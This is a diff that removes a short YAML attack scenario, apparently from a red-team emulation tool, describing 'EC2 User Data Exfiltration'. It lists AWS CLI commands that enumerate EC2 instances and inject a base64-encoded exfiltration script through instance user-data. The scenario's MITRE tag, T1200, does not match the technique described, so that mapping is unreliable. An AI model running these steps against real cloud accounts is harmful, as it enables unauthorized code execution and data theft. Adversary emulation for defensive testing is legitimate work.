@@ -1,9 +1,0 @@
-name: EC2 User Data Exfiltration
-description: Abuse EC2 user-data for data exfiltration
-mitre_technique: T1200
-stage: Exfiltration
-steps:
-  - action: aws ec2 describe-instances --query 'Reservations[*].Instances[*].InstanceId'
-    description: List EC2 instances
-  - action: aws ec2 modify-instance-attribute --instance-id <instance-id> --user-data file://exfil-script.b64
-    description: Inject a base64-encoded exfiltration script via EC2 user-data
